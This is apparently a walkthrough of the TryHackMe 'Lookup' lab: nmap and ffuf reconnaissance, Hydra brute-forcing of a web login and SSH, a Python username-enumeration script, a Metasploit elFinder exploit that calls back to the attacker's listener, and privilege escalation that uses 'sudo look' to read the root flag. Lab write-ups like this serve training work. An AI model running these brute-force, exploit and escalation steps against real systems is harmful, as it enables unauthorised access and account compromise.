# 🔍 Lookup THM Walkthrough

A practical pentesting walkthrough involving subdomain enumeration, brute-force login attacks, and post-exploitation with Metasploit.

---

## 📌 1. Recon: Nmap Scan

Run a simple Nmap scan to identify open ports and services:

```bash
nmap -A -F -oN lookup.txt <target_ip>
nmap -Pn -sV -sC -p 22,80 <target_ip>
```

Add target domain to `/etc/hosts`:

```bash
echo "<target_ip> lookup.thm" | sudo tee -a /etc/hosts
```

---

## 🌐 2. Subdomain & Web Content Enumeration

### 🔎 Subdomain Search (FFUF)

```bash
ffuf -u http://lookup.thm -H "Host: FUZZ.lookup.thm" \
-w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fw 1
```

*(None were found in this case)*

### 📁 Directory/Endpoint Fuzzing

```bash
ffuf -w /usr/share/wordlists/seclists/Discovery/Web_Content/big.txt \
-u http://lookup.thm/FUZZ -e .php
```

---

## 🔐 3. Brute Forcing the Login Page

### 🧪 Attempt #1 – Basic Hydra:

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt lookup.thm \
http-post-form "/login.php:username=^USER^&password=^PASS^:Wrong password. Please try again." -IV 64
```

### 🔄 Attempt #2 – Username Discovery First:

```bash
hydra -p aaa -L /usr/share/wordlists/seclists/Usernames/Names/names.txt lookup.thm \
http-post-form "/login.php:username=^USER^&password=^PASS^:username"
```

✔️ Found users: `ADMIN`, `JOSE`

### 🔐 Then, Password Discovery for User

```bash
hydra -l jose -P /usr/share/wordlists/seclists/Passwords/2023-200_most_used_passwords.txt lookup.thm \
http-post-form "/login.php:username=^USER^&password=^PASS^:Wrong" -f -v
```

---

## 🐍 Script: Username Checker

```python
import requests
import multiprocessing

target = 'http://lookup.thm/login.php'
username_file = '/usr/share/wordlists/seclists/Usernames/Names/names.txt'

def user_check(name, target):
    data = {"username": name, "password": "password"}
    response = requests.post(target, data=data)
    if "Wrong password" in response.text:
        print(f"User found: {name}")

try:
    with open(username_file, 'r') as user_file:
        users = user_file.readlines()
    for user in users:
        user = user.strip('\n')
        multiprocessing.Process(target=user_check, args=(user, target)).start()
except FileNotFoundError:
    print(f'Error: File path {username_file} does not exist.')
```

---

## ⚔️ 4. Exploitation with Metasploit

### 🛠️ Search for elFinder Exploit:

```bash
search elfinder
```

Choose **PHP connector injection** and set:

```bash
set RHOSTS files.lookup.thm
set LHOST <your_tun0_ip>
```

---

## 💻 5. Post Exploitation

### 🧷 Spawn a Stable Shell:

```bash
python3 -c "import pty; pty.spawn('/bin/bash')"
export TERM=xterm
```

### 🗂️ Useful Enumeration Commands:

```bash
find / -perm /4000 2>/dev/null
ls -al /home/think
sudo -l
ls -al /usr/bin/look
sudo look '' /root/root.txt
```

---

## 🔐 Optional: Brute Force SSH Access

If you found credentials:

```bash
hydra -l think -P passlist.txt ssh://lookup.thm
```

Then connect:

```bash
ssh think@lookup.thm
```

---

## 📘 Extra Info

- **`look` Command**: Used to search lines that begin with a given string. Great for searching large files quickly.

---

## 🧠 Pro Tips

- Don’t forget to update `/etc/hosts` when using new subdomains or web requests.
- Always use `-v` or `-V` with tools like Hydra to debug or view details.
- Automate boring tasks with small scripts to save time.

---

> ✨ Happy Hacking! Stay curious, stay ethical.
